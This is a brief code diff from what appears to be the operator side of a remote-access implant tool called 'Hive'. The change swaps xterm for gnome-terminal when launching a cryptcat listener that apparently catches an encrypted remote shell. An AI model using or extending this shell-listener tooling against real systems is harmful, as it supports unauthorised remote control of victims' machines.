@@ -317,8 +317,8 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 		//	snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
 
 		memset( gnomeTerminalCommand, 0, 255);    //Clear it out before we use it...
-		snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
-//		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+//		snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
 		DLX(6, printf("Forking...\n"));
 		forkret = fork();
 		if (forkret == 0) {
